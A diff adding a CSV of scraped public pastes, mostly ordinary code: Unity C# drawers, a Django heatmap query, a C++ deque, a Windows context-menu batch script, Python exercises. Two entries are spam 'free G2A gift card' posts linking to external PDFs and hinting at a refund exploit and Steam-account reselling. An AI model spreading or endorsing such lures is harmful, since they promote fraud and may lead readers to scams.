@@ -1,0 +1,4418 @@
+id,title,username,language,date,content
+zUyGsBHn,Untitled,Ilya_Bykonya,C#,Thursday 14th of March 2024 01:01:04 PM CDT,"using System.Collections;
+using System.Collections.Generic;
+using UnityEditor;
+using UnityEngine;
+
+namespace Utils
+{
+    public class ReadOnlyAttribute : PropertyAttribute { }
+
+    [CustomPropertyDrawer(typeof(ReadOnlyAttribute))]
+    public class ReadOnlyDrawer : PropertyDrawer
+    {
+        public override float GetPropertyHeight(SerializedProperty property, GUIContent label)
+        {
+            return EditorGUI.GetPropertyHeight(property, label, true);
+        }
+        public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)
+        {
+            GUI.enabled = false;
+            EditorGUI.PropertyField(position, property, label, true);
+            GUI.enabled = true;
+        }
+    }
+}"
+ArLgdGF5,Untitled,Ilya_Bykonya,C#,Thursday 14th of March 2024 12:57:39 PM CDT,"﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using UnityEngine.Events;
+using UnityEngine;
+using Utils;
+using UnityEditor.UIElements;
+using UnityEditor;
+using UnityEngine.UIElements;
+using UnityEditor.PackageManager.UI;
+using UnityEditor.Rendering;
+using UnityEditor.Experimental.GraphView;
+using System.Reflection;
+
+namespace Utils
+{
+    [Serializable]
+    public class ActiveField<T>
+    {
+        [SerializeField] private T _value;
+        public UnityEvent Changed;
+
+        public T Value
+        {
+            get => _value;
+            set
+            {
+                _value = value;
+                Changed?.Invoke();
+            }
+        }
+
+        public void SetValue(T value) => Value = value;
+        public ActiveField(T value, UnityEvent changed)
+        {
+            Changed = changed;
+            _value = value;
+        }
+    }
+
+
+    
+    [CustomPropertyDrawer(typeof(ActiveField<>))]
+    public class ActiveFieldDrawer : PropertyDrawer
+    {
+        public override VisualElement CreatePropertyGUI(SerializedProperty property)
+        {
+            var serialized_changed_event_property = property.FindPropertyRelative(""Changed"");
+            var changed_event = PropertyReflectionGetter.SerializedPropertyToObject<UnityEvent>(serialized_changed_event_property);
+
+            var container = new VisualElement();
+            var changed_event_field = new PropertyField(serialized_changed_event_property);
+            var value_field = new PropertyField(property.FindPropertyRelative(""_value""));
+
+            value_field.RegisterValueChangeCallback((_) => changed_event?.Invoke());
+            container.Add(new Label($""ActiveEvent<>: [{property.displayName}]""));
+            container.Add(value_field);
+            container.Add(changed_event_field);
+            return container;
+        }
+    }
+    public static class PropertyReflectionGetter
+    {
+        public static T SerializedPropertyToObject<T>(SerializedProperty property)
+        {
+            return GetNestedObject<T>(property.propertyPath, GetSerializedPropertyRootComponent(property), true); //The ""true"" means we will also check all base classes
+        }
+        public static Component GetSerializedPropertyRootComponent(SerializedProperty property)
+        {
+            return (Component)property.serializedObject.targetObject;
+        }
+        public static T GetNestedObject<T>(string path, object obj, bool includeAllBases = false)
+        {
+            foreach (string part in path.Split('.'))
+            {
+                obj = GetFieldOrPropertyValue<object>(part, obj, includeAllBases);
+            }
+            return (T)obj;
+        }
+        public static T GetFieldOrPropertyValue<T>(string fieldName, object obj, bool includeAllBases = false, BindingFlags bindings = BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)
+        {
+            FieldInfo field = obj.GetType().GetField(fieldName, bindings);
+            if (field != null) return (T)field.GetValue(obj);
+
+            PropertyInfo property = obj.GetType().GetProperty(fieldName, bindings);
+            if (property != null) return (T)property.GetValue(obj, null);
+
+            if (includeAllBases)
+            {
+                foreach (Type type in GetBaseClassesAndInterfaces(obj.GetType()))
+                {
+                    field = type.GetField(fieldName, bindings);
+                    if (field != null) return (T)field.GetValue(obj);
+
+                    property = type.GetProperty(fieldName, bindings);
+                    if (property != null) return (T)property.GetValue(obj, null);
+                }
+            }
+
+            return default(T);
+        }
+        public static void SetFieldOrPropertyValue<T>(string fieldName, object obj, object value, bool includeAllBases = false, BindingFlags bindings = BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)
+        {
+            FieldInfo field = obj.GetType().GetField(fieldName, bindings);
+            if (field != null)
+            {
+                field.SetValue(obj, value);
+                return;
+            }
+
+            PropertyInfo property = obj.GetType().GetProperty(fieldName, bindings);
+            if (property != null)
+            {
+                property.SetValue(obj, value, null);
+                return;
+            }
+
+            if (includeAllBases)
+            {
+                foreach (Type type in GetBaseClassesAndInterfaces(obj.GetType()))
+                {
+                    field = type.GetField(fieldName, bindings);
+                    if (field != null)
+                    {
+                        field.SetValue(obj, value);
+                        return;
+                    }
+
+                    property = type.GetProperty(fieldName, bindings);
+                    if (property != null)
+                    {
+                        property.SetValue(obj, value, null);
+                        return;
+                    }
+                }
+            }
+        }
+        public static IEnumerable<Type> GetBaseClassesAndInterfaces(this Type type, bool includeSelf = false)
+        {
+            List<Type> allTypes = new List<Type>();
+
+            if (includeSelf) allTypes.Add(type);
+
+            if (type.BaseType == typeof(object))
+            {
+                allTypes.AddRange(type.GetInterfaces());
+            }
+            else
+            {
+                allTypes.AddRange(
+                        Enumerable
+                        .Repeat(type.BaseType, 1)
+                        .Concat(type.GetInterfaces())
+                        .Concat(type.BaseType.GetBaseClassesAndInterfaces())
+                        .Distinct());
+                //I found this on stackoverflow
+            }
+
+            return allTypes;
+        }
+    }
+
+
+    /*
+    [CustomPropertyDrawer(typeof(ActiveField<float>))]
+    public class ActiveFieldEditor : PropertyDrawer
+    {
+        public override float GetPropertyHeight(SerializedProperty property, GUIContent label)
+        {
+            return base.GetPropertyHeight(property, label) * 3;
+        }
+        public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)
+        {
+            var freeRect = EditorGUI.PrefixLabel(position, new GUIContent($""He-he""));
+            base.OnGUI(position, property, label);
+            */
+    /*
+    using (var scope = new EditorGUI.PropertyScope(position, label, property))
+    {
+        var freeRect = EditorGUI.PrefixLabel(position, new GUIContent($""He-he""));
+    }
+    */
+    /*
+    var minLimit = property.FindPropertyRelative(""minLimit"");
+    var maxLimit = property.FindPropertyRelative(""maxLimit"");
+    var minValue = property.FindPropertyRelative(""minValue"");
+    var maxValue = property.FindPropertyRelative(""maxValue"");
+    using (var scope = new EditorGUI.PropertyScope(position, label, property))
+    {
+        var freeRect = EditorGUI.PrefixLabel(position, new GUIContent($""{minLimit.floatValue}|{maxLimit.floatValue}""));
+        var lineSize = freeRect.height / 3;
+
+        EditorGUI.BeginChangeCheck();
+        var minValueFloat = minValue.floatValue;
+        var maxValueFloat = maxValue.floatValue;
+        var sliderRect = new Rect(freeRect.x, freeRect.y, freeRect.width, lineSize);
+        EditorGUI.MinMaxSlider(sliderRect, ref minValueFloat, ref maxValueFloat, minLimit.floatValue, maxLimit.floatValue);
+
+        var minLimitRect = new Rect(freeRect.x, freeRect.y + 1 * lineSize, freeRect.width, lineSize);
+        var maxLimitRect = new Rect(freeRect.x, freeRect.y + 2 * lineSize, freeRect.width, lineSize);
+        var minLimitFloat = EditorGUI.FloatField(new Rect(minLimitRect), ""Min limit"", minLimit.floatValue);
+        var maxLimitFloat = EditorGUI.FloatField(new Rect(maxLimitRect), ""Max limit"", maxLimit.floatValue);
+
+        if (EditorGUI.EndChangeCheck())
+        {
+            minLimit.floatValue = minLimitFloat;
+            maxLimit.floatValue = maxLimitFloat;
+            minValue.floatValue = minValueFloat;
+            maxValue.floatValue = maxValueFloat;
+        }
+    }
+    */
+    /*}
+        }*/
+    //    [CustomEditor(typeof(ActiveField<>))]
+    //    class GenericActiveFieldEditor : Editor
+    //    {
+    //        public override void OnInspectorGUI()
+    //        {
+    //            EditorGUILayout.LabelField(""I'm shown OK generic"");
+    //        }
+    //    }
+    //    [CustomEditor(typeof(ActiveField<float>))]
+    //    class FloatActiveFieldEditor: Editor
+    //    {
+    //        public override void OnInspectorGUI()
+    //        {
+    //            EditorGUILayout.LabelField(""I'm shown OK float"");
+    //        }
+    //    }
+}"
+uc5ZjHnP,G2A.com Free Gift Card Guide Mar 2024 NEW,luckysw,GetText,Thursday 14th of March 2024 12:35:57 PM CDT,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+ 
+IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!
+ 
+You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
+ 
+PDF guide here:
+https://drive.google.com/file/d/1aOBwxx73UL1B5zML5LsDdQ4k3YafTnrc/view?usp=sharing
+ 
+ 
+Working as of:
+14 March 2024
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ "
+E9d6NGiD,delivery heatmap randomize,soyuzbek,Python,Thursday 14th of March 2024 12:13:33 PM CDT,"    delivery_points = models.Order.all_objects.filter(
+        delivery_point__latitude__isnull=False,
+        delivery_point__longitude__isnull=False,
+        *default_filter_args,
+        **filter_params,
+    ).select_related('delivery_point').annotate(
+        rounded_latitude=RawSQL('round(""order__delivery_point"".""latitude"", 2)'),
+        rounded_longitude=RawSQL('round(""order__delivery_point"".""longitude"", 2)'),
+        count=Count('delivery_point__latitude'),
+    ).group_by('rounded_latitude', 'rounded_longitude').values(
+        'rounded_latitude',
+        'rounded_longitude',
+        'count',
+    )
+    
+    query = f""""""
+            SELECT
+             count(""delivery_points"".""count"") as ""count"",
+             ""delivery_points"".""rounded_latitude"" as ""latitude"",
+             ""delivery_points"".""rounded_longitude"" as ""longitude""
+            FROM ({delivery_points.as_query()}) AS ""delivery_points""
+            GROUP BY
+              ""delivery_points"".""rounded_latitude"",
+              ""delivery_points"".""rounded_longitude""
+         """"""
+    # noinspection PyUnusedLocal
+    result_list = []
+    async with database_connection() as conn:
+        data = await conn.fetch(query)
+        result_list = parse_obj_as(List[HeatmapResponseItem], data)
+    
+    
+    
+
+    # noinspection PyMethodParameters
+    @pydantic.validator('latitude', 'longitude')
+    def randomize_geodata(cls, value):
+        return round(uniform(value - 0.005, value + 0.005), 5)"
+1hFq4BJ5,stack,mantha_raghava,Java,Thursday 14th of March 2024 12:08:49 PM CDT,"import java.util.Scanner;
+
+public class Solution {
+    
+    public static void main(String[] args) {
+        
+        Scanner scanner = new Scanner(System.in);
+        int t = scanner.nextInt();
+        scanner.nextLine(); 
+
+        String[] stack = new String[10000];
+        int top = -1;
+        for (int i = 0; i < t; i++) {
+            String[] input = scanner.nextLine().split("" "");
+            if (input[0].equals(""push"")) {
+                stack[++top] = input[1];
+            } else if (input[0].equals(""pop"")) {
+                if (top == -1) {
+                    System.out.println(""Empty"");
+                }
+                else{
+                    System.out.println(stack[top]);
+                    top--;
+                }
+            }
+        }
+        
+    }
+}
+"
+X2aFKUCP,Windows11_Kontextmenue,Takiry,Batch,Thursday 14th of March 2024 12:06:38 PM CDT,"@echo off
+set /p sid=SID des Nutzers:
+echo.
+
+echo Wie soll das Kontextmenue aussehen?
+echo 1 = Wie bei Windows 10
+echo 2 = Wie bei Windows 11
+echo.
+set /p ausw=Auswahl:
+
+if %ausw% EQU 1 (
+reg.exe add ""HKEY_USERS\%sid%_Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32"" /f /ve
+goto restart
+)
+
+if %ausw% EQU 2 (
+reg.exe delete ""HKEY_USERS\%sid%_Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32"" /f /ve
+goto restart
+)
+else (
+exit
+)
+
+:restart
+shutdown.exe -r -f -t 1"
+CvQ3sWvU,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Thursday 14th of March 2024 11:56:13 AM CDT,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+
+If you use this make sure to use the English version of G2A.com otherwise this will not work!
+ 
+PDF guide here:
+https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_730191.pdf
+
+Working as of:
+14 March 2024
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+"
+auNRUH31,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Thursday 14th of March 2024 11:52:18 AM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free
+
+Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes
+
+150+ different syntax languages - All Free
+Paste Folders
+Load files feature
+Password protected pastes
+Encrypted pastes
+URL Shortener
+Unlisted pastes
+Private pastes
+Paste expiration system
+Self destroy pastes
+Embed, download, print pastes
+Socialite (Facebook/Twitter/Google Social login)
+Trending pastes page (day, week, month, year)
+Password protected pastes
+Encrypted pastes
+URL Shortener
+Unlisted pastes
+Private pastes
+Paste expiration system
+Self destroy pastes
+Share pastes on social network
+Facebook/Disqus/Custom comment system
+Invisible/Custom captcha protection
+Trending pastes page (day, week, month, year)
+No Captcha for logged in users feature
+Simple Ads by Google Adsense Few rather than Pastebin"
+tb3sLyee,Simba - Align & Stack,WarPie90,Delphi,Thursday 14th of March 2024 11:49:13 AM CDT,"program new;
+{$I SRL/osr.simba}
+{$R-}
+
+type
+  TMufImage  = TMufasaBitmap;
+  TMufImages = array of TMufImage;
+
+function StackMedian(lst: TMufImages): TMufImage;
+var
+  x,y,i: Int32;
+  R,G,B: TIntegerArray;
+  color: TRGB32;
+begin
+  result.Init();
+  result.SetSize(lst[0].GetWidth(), lst[0].GetHeight());
+  SetLength(R, Length(lst));
+  SetLength(G, Length(lst));
+  SetLength(B, Length(lst));
+
+  for y:=0 to result.GetHeight()-1 do
+    for x:=0 to result.GetWidth()-1 do
+    begin
+      for i:=0 to High(lst) do
+      begin
+        color := TRGB32(lst[i].GetPixel(x,y));
+        R[i] := color.R;
+        G[i] := color.G;
+        B[i] := color.B;
+      end;
+      color.R := R.Sorted()[length(R) div 2];
+      color.G := G.Sorted()[length(R) div 2];
+      color.B := B.Sorted()[length(R) div 2];
+
+      result.SetPixel(x,y, TColor(color));
+    end;
+end;
+
+procedure TMufImage.EnhanceColor(f: Single);
+var
+  x,y: Int32;
+  H,S,L: Extended;
+begin
+  for y:=0 to self.GetHeight()-1 do
+    for x:=0 to self.GetWidth()-1 do
+    begin
+      ColorToHSL(self.GetPixel(x,y),H,S,L);
+      Self.SetPixel(x,y, HSLToColor(H,Min(100,Max(0,S*f)),L));
+    end;
+end;
+
+procedure TMufImage.LightContrast(f: Single);
+var
+  x,y: Int32;
+  H,S,L: Extended;
+begin
+  for y:=0 to self.GetHeight()-1 do
+    for x:=0 to self.GetWidth()-1 do
+    begin
+      ColorToHSL(self.GetPixel(x,y),H,S,L);
+      Self.SetPixel(x,y, HSLToColor(H,S,Min(100,Max(0,L*f))));
+    end;
+end;
+
+procedure TMufImage.AdjustPop(f: Single; MidPt: Single=0.5);
+var
+  x,y: Int32;
+  H,S,L: Extended;
+  newS, newL: Extended;
+begin
+  for y:=0 to self.GetHeight()-1 do
+    for x:=0 to self.GetWidth()-1 do
+    begin
+      ColorToHSL(self.GetPixel(x,y),H,S,L);
+
+      newS := Min(100,Max(0,(MidPt+(S/100-MidPt)*f)*100));
+      newL := (Min(100,Max(0,(MidPt+(L/100-MidPt)*f)*100)) + L) / 2;
+
+      Self.SetPixel(x,y, HSLToColor(H, newS, newL));
+    end;
+end;
+
+function StackMean(lst: TMufImages): TMufImage;
+var
+  x,y,i: Int32;
+  R,G,B: Int32;
+  color: TRGB32;
+
+begin
+  result.Init();
+  result.SetSize(lst[0].GetWidth(), lst[0].GetHeight());
+
+  for y:=0 to result.GetHeight()-1 do
+    for x:=0 to result.GetWidth()-1 do
+    begin
+      r := 0;
+      g := 0;
+      b := 0;
+      for i:=0 to High(lst) do
+      begin
+        color := TRGB32(lst[i].GetPixel(x,y));
+        R += color.R;
+        G += color.G;
+        B += color.B;
+      end;
+      R /= Length(lst);
+      G /= Length(lst);
+      B /= Length(lst);
+      color := [B,G,R];
+      result.SetPixel(x,y, TColor(color));
+    end;
+end;
+
+procedure TMufasaBitmap.Offset(ax,ay: Int32);
+var w,h,x,y: Int32;
+begin
+  w := Self.getWidth()-1;
+  h := Self.getHeight()-1;
+
+  for y:=h downto 0 do
+    for x:=w downto 0 do //boundchecking internaly in simba
+      self.SetPixel(x+ax,y+ay, self.GetPixel(x,y));
+end;
+
+procedure Alignment(base:TMufImage; lst: TMufImages; Area:Int32=150);
+  function VerifyIntegrity(patch: TMufImage): Boolean;
+  var x,y: Int32;
+  begin
+    Result := patch.PeakBrightness() > 20;
+  end;
+var
+  locations: TPointArray;
+  patch,tmp: TMufImage;
+  i,x,y,w,h: Int32;
+  p: TPoint;
+begin
+  w := base.getWidth()-1;
+  h := base.getHeight()-1;
+  for patch in lst do
+  begin
+    locations := [];
+    for y:=0 to h with area do
+      for x:=0 to w with area do
+      begin
+        tmp := patch.Copy(x,y, Min(x+area, w), Min(y+area, h));
+        if VerifyIntegrity(tmp) then
+          locations += base.MatchTemplate(tmp, TM_CCOEFF_NORMED).ArgMax() + Point(-x,-y);
+
+        tmp.Free();
+      end;
+
+    p := locations.Median();
+    WriteLn('Offsetting by: ', p);
+    patch.Offset(p.x, p.y);
+  end;
+end;
+
+
+
+var
+  patch,res,bmp: TMufImage;
+  i: Int32;
+  tmp,idx: string;
+  TSA: TStringArray;
+  mat: TSingleMatrix;
+  at,rel: TPoint;
+
+  lst: TMufImages;
+begin
+  bmp.Init();
+  bmp.LoadFromFile('C:\Users\Eier\Desktop\Ny mappe (4)\crop\a_0000_392A0001.CR2.png');
+
+  TSA := GetFiles('C:\Users\Eier\Desktop\Ny mappe (4)\crop\','png');
+
+  WriteLn('Loading images...');
+  for tmp in TSA do
+  begin
+    patch.Init();
+    patch.LoadFromFile('C:\Users\Eier\Desktop\Ny mappe (4)\crop\'+tmp);
+
+    lst += patch;
+    WriteLn(tmp);
+  end;
+
+  WriteLn('Applying alignment...');
+  Alignment(bmp, lst);
+
+  WriteLn('Stacking...');
+  res := StackMean(lst);
+
+  res.EnhanceColor(1.8);
+  res.AdjustPop(1.6);
+  res.LightContrast(1.3);
+  res.Debug();
+
+  res.SaveToFile('autostack.png');
+  res.Free();
+end."
+t8xzdZms,Untitled,a_rasskazkin,C++,Thursday 14th of March 2024 11:46:43 AM CDT,"#include <iostream>
+
+//class T {};
+
+template <class T>
+class Deque {
+ public:
+  Deque() = default;
+  Deque(int new_size, const T& value) {
+    for (int i = 0; i < new_size; ++i) {
+      try {
+        push_back(value);
+      } catch (...) {
+        for (i--; i >= 0; --i) {
+          pop_back();
+        }
+        throw;
+      }
+    }
+  }
+  explicit Deque(int new_size) : Deque(new_size, T()) {}
+  Deque(const Deque& other) {
+    for (size_t i = 0; i < other.size(); ++i) {
+      push_back(other[i]);
+    }
+  }
+
+  void push_back(const T& value) {
+    if (right_index_ == 0) {
+      data_.PushBack(GetNewRow());
+    }
+    try {
+      new(data_.Back() + right_index_) T(value);
+    } catch(...) {
+      if (right_index_ == 0) {
+        data_.PopBack();
+      }
+      throw;
+    }
+    right_index_ = (right_index_ + 1) % kBlockSize_;
+    ++size_;
+  }
+  void push_front(const T& value) {
+    --left_index_;
+    if (left_index_ == -1) {
+      data_.PushFront(GetNewRow());
+      left_index_ += kBlockSize_;
+    }
+    try {
+      new(data_.Front() + left_index_) T(value);
+    } catch (...) {
+      ++left_index_;
+      if (left_index_ == kBlockSize_) {
+        data_.PopFront();
+        left_index_ = 0;
+      }
+      throw;
+    }
+    ++size_;
+  }
+
+  void pop_back() {
+    right_index_ = (right_index_ + kBlockSize_ - 1) % kBlockSize_;
+    data_.Back()[right_index_].~T();
+    if (right_index_ == 0) {
+      data_.PopBack();
+    }
+    --size_;
+  }
+  void pop_front() {
+    data_.Front()[left_index_].~T();
+    ++left_index_;
+    if (left_index_ == kBlockSize_) {
+      data_.PopFront();
+      left_index_ = 0;
+    }
+    --size_;
+  }
+
+  [[nodiscard]] size_t size() const {
+    return size_;
+  }
+
+  T& operator[] (size_t index) {
+    return *(begin() + index);
+  }
+  const T& operator[] (size_t index) const {
+    return *(begin() + index);
+  }
+  T& at(size_t index) {
+    if (index >= size_) {
+      throw std::out_of_range(""Index out of range"");
+    }
+    return operator[](index);
+  }
+  const T& at(size_t index) const {
+    if (index >= size_) {
+      throw std::out_of_range(""Index out of range"");
+    }
+    return operator[](index);
+  }
+
+ private:
+
+  class InsideDeque {
+   public:
+    T* operator[] (int index) {
+      return data_[index];
+    }
+
+    const T* operator[] (int index) const {
+      return data_[index];
+    }
+
+    void PushBack(T* value) {
+      if (right_index_ == capacity_) {
+        IncreaseCapacity(false);
+      }
+
+      data_[right_index_] = value;
+      ++right_index_;
+    }
+
+    void PushFront(T* value) {
+      if (left_index_ == 0) {
+        IncreaseCapacity(true);
+      }
+
+      --left_index_;
+      data_[left_index_] = value;
+    }
+
+    void PopFront() {
+      delete[] reinterpret_cast<char*>(data_[left_index_]);
+      ++left_index_;
+    }
+
+    void PopBack() {
+      --right_index_;
+      delete[] reinterpret_cast<char*>(data_[right_index_]);
+    }
+
+    [[nodiscard]] T*Front() const {
+      return data_[left_index_];
+    }
+
+    [[nodiscard]] T* Back() const {
+      return data_[right_index_ - 1];
+    }
+
+    const T** GetConstData() const {
+      return const_cast<const T**>(data_);
+    }
+
+    void IncreaseCapacity(bool is_back) {
+      int new_capacity = capacity_ * 2 + 1;
+      T** new_data_ = new T*[new_capacity];
+      int shift_ = is_back * (new_capacity - capacity_);
+
+      for (int i = left_index_; i < right_index_; ++i) {
+        new_data_[i + shift_] = data_[i];
+      }
+      left_index_ += shift_;
+      right_index_ += shift_;
+      capacity_ = new_capacity;
+
+      delete[] data_;
+      data_ = new_data_;
+    }
+
+    ~InsideDeque() {
+      for (int i = left_index_; i < right_index_; ++i) {
+        delete[] reinterpret_cast<char*>(data_[i]);
+      }
+      delete[] data_;
+    }
+
+    T** data_ = nullptr;
+
+    int left_index_ = 0;
+    int right_index_ = 0;
+    int capacity_ = 0;
+  };
+
+  template <bool is_const>
+  class iteratorPrototype {
+    using Type = std::conditional_t<is_const, const T, T>;
+
+    iteratorPrototype(Type** data, int first, int second) : data_(data), first_ind(first), second_ind(second) {}
+
+    friend Deque;
+   public:
+
+    using iterator_concept = std::random_access_iterator_tag;
+    using iterator_category = std::random_access_iterator_tag;
+    using value_type = std::conditional_t<is_const, const T, T>;
+    using difference_type = std::ptrdiff_t;
+    using pointer = std::conditional_t<is_const, const T*, T*>;
+    using reference = std::conditional_t<is_const, const T&, T&>;
+
+    Type** data_;
+    int first_ind;
+    int second_ind;
+    iteratorPrototype& operator+= (int value) {
+      second_ind += value;
+      int new_second = (second_ind % kBlockSize_ + kBlockSize_) % kBlockSize_;
+      first_ind += (second_ind - new_second) / kBlockSize_;
+      second_ind = new_second;
+      return *this;
+    }
+    iteratorPrototype& operator-= (int value) {
+      second_ind -= value;
+      int new_second = (second_ind % kBlockSize_ + kBlockSize_) % kBlockSize_;
+      first_ind -= (new_second - second_ind) / kBlockSize_;
+      second_ind = new_second;
+      return *this;
+    }
+    iteratorPrototype& operator++ () {
+      return operator+=(1);
+    }
+    iteratorPrototype& operator-- () {
+      return operator-=(1);
+    }
+    iteratorPrototype<is_const> operator++ (int) {
+      iteratorPrototype result = *this;
+      operator++();
+      return result;
+    }
+    iteratorPrototype<is_const> operator-- (int) {
+      iteratorPrototype result = *this;
+      operator--();
+      return result;
+    }
+    iteratorPrototype operator+ (int value) const {
+      iteratorPrototype result = *this;
+      result += value;
+      return result;
+    }
+    iteratorPrototype operator- (int value) const {
+      iteratorPrototype result = *this;
+      result -= value;
+      return result;
+    }
+
+    template <bool another_const>
+    iteratorPrototype operator= (const iteratorPrototype<another_const>& index) {
+      first_ind = index.first_ind;
+      second_ind = index.second_ind;
+      if constexpr (is_const && !another_const) {
+        data_ = const_cast<Type**>(index.data_);
+      } else if constexpr (!is_const && another_const) {
+        throw std::logic_error(""Can't assign const iteratorPrototype to non-const iteratorPrototype"");
+      } else {
+        data_ = index.data_;
+      }
+      return *this;
+    }
+    template<bool another_const>
+    bool operator== (const iteratorPrototype<another_const>& index) const {
+      return first_ind == index.first_ind && second_ind == index.second_ind;
+    }
+    template<bool another_const>
+    bool operator!= (const iteratorPrototype<another_const>& index) const {
+      return !(*this == index);
+    }
+    template<bool another_const>
+    bool operator< (const iteratorPrototype<another_const>& index) const {
+      return first_ind < index.first_ind || (first_ind == index.first_ind && second_ind < index.second_ind);
+    }
+    template<bool another_const>
+    bool operator> (const iteratorPrototype<another_const>& index) const {
+      return index < *this;
+    }
+    template<bool another_const>
+    bool operator<= (const iteratorPrototype<another_const>& index) const {
+      return !(*this > index);
+    }
+    template<bool another_const>
+    bool operator>= (const iteratorPrototype<another_const>& index) const {
+      return !(*this < index);
+    }
+
+    Type* operator-> () {
+      return &data_[first_ind][second_ind];
+    }
+    Type& operator* () {
+      return data_[first_ind][second_ind];
+    }
+
+    std::ptrdiff_t operator- (const iteratorPrototype& index) {
+      return (first_ind - index.first_ind) * kBlockSize_ + (second_ind - index.second_ind);
+    }
+
+    operator iteratorPrototype<true>() const {
+      return iteratorPrototype<true>(data_, first_ind, second_ind);
+    }
+  };
+
+ public:
+
+  using const_iterator = iteratorPrototype<true>;
+  using iterator = iteratorPrototype<false>;
+
+  iterator begin() {
+    return iterator(data_.data_, data_.left_index_, left_index_);
+  }
+  iterator end() {
+    return iterator(data_.data_, data_.right_index_ - (right_index_ != 0 ? 1 : 0), right_index_);
+  }
+  const_iterator begin() const {
+    return cbegin();
+  }
+  const_iterator end() const {
+    return cend();
+  }
+  const_iterator cbegin() const {
+    return const_iterator(data_.GetConstData(), data_.left_index_, left_index_);
+  }
+  const_iterator cend() const {
+    return const_iterator(data_.GetConstData(), data_.right_index_ - (right_index_ != 0 ? 1 : 0), right_index_);
+  }
+
+  std::reverse_iterator<iterator> rbegin() {
+    return std::reverse_iterator<iterator>(end());
+  }
+  std::reverse_iterator<iterator> rend() {
+    return std::reverse_iterator<iterator>(begin());
+  }
+  std::reverse_iterator<const_iterator> rbegin() const {
+    return std::reverse_iterator<const_iterator>(cend());
+  }
+  std::reverse_iterator<const_iterator> rend() const {
+    return std::reverse_iterator<const_iterator>(cbegin());
+  }
+  std::reverse_iterator<const_iterator> crbegin() const {
+    return std::reverse_iterator<const_iterator>(cend());
+  }
+  std::reverse_iterator<const_iterator> crend() const {
+    return std::reverse_iterator<const_iterator>(cbegin());
+  }
+
+  template<bool another_const>
+  void insert(const iteratorPrototype<another_const>& it, const T& value) {
+    push_back(value);
+    for (auto nit = end() - 1; nit != it; --nit) {
+      std::swap(*nit, *(nit - 1));
+    }
+  }
+  template<bool another_const>
+  void erase(const iteratorPrototype<another_const>& it) {
+    for (auto nit = it; nit <= end() - 2; ++nit) {
+      std::swap(*nit, *(nit + 1));
+    }
+    pop_back();
+  }
+
+  T* GetNewRow() {
+    T* new_row = reinterpret_cast<T*>(new char[kBlockSize_ * sizeof(T)]);
+    return new_row;
+  }
+
+  ~Deque() {
+    for (size_t i = 0; i < size_; ++i) {
+      operator[](i).~T();
+    }
+  }
+
+  Deque& operator= (const Deque& other) {
+    for (size_t i = 0; i < other.size_; ++i) {
+      if (i == size_) {
+        push_back(other[i]);
+      } else {
+        operator[](i) = other[i];
+      }
+    }
+    while (size_ > other.size_) {
+      pop_back();
+    }
+    return *this;
+  }
+
+  static constexpr int kBlockSize_ = 2;
+  int left_index_ = 0;
+  int right_index_ = 0;
+  size_t size_ = 0;
+  InsideDeque data_;
+};
+"
+He3PQtnV,Untitled,panupatchong,Python,Thursday 14th of March 2024 11:26:22 AM CDT,"class LogicGate:
+    def __init__(self, name):
+        self.name = name
+        self.pinA = None
+        self.pinB = None
+
+    def set_pins(self, pinA, pinB):
+        self.pinA = pinA
+        self.pinB = pinB
+
+
+class HalfAdder(LogicGate):
+    def __init__(self, name):
+        super().__init__(name)
+        self.xor_gate = XorGate(""xor1"")
+        self.and_gate = AndGate(""and1"")
+
+    def getOutput(self):
+        if self.pinA is None or self.pinB is None:
+            return ""Pins not set. Cannot perform gate logic.""
+        
+        self.xor_gate.pinA = self.pinA
+        self.xor_gate.pinB = self.pinB
+        self.and_gate.pinA = self.pinA
+        self.and_gate.pinB = self.pinB
+
+        ## OR, if you implemented set_pins ##
+        self.xor_gate.set_pins(self.pinA, self.pinB)
+        self.and_gate.set_pins(self.pinA, self.pinB)
+        #####################################
+
+        gate_sum = self.xor_gate.getOutput()
+        gate_carry = self.and_gate.getOutput()
+
+        return gate_sum, gate_carry
+
+
+class BinaryGate(LogicGate):
+    pass
+
+class AndGate(BinaryGate):
+    pass
+
+"
+rbYkifLs,Untitled,panupatchong,Python,Thursday 14th of March 2024 11:22:28 AM CDT,"class LogicGate:
+    def __init__(self, name):
+        self.name = name
+        self.pinA = None
+        self.pinB = None
+
+    def set_pins(self, pinA, pinB):
+        self.pinA = pinA
+        self.pinB = pinB
+
+
+class HalfAdder(LogicGate):
+    def __init__(self, name):
+        super().__init__(name)
+        self.xor_gate = XorGate(""xor1"")
+        self.and_gate = AndGate(""and1"")
+
+    def getOutput(self):
+        if self.pinA is None or self.pinB is None:
+            return None
+        self.xor_gate.pinA = self.pinA
+        self.xor_gate.pinB = self.pinB
+        self.and_gate.pinA = self.pinA
+        self.and_gate.pinB = self.pinB
+
+        ## OR, if you implemented set_pins
+        self.xor_gate.set_pins(self.pinA, self.pinB)
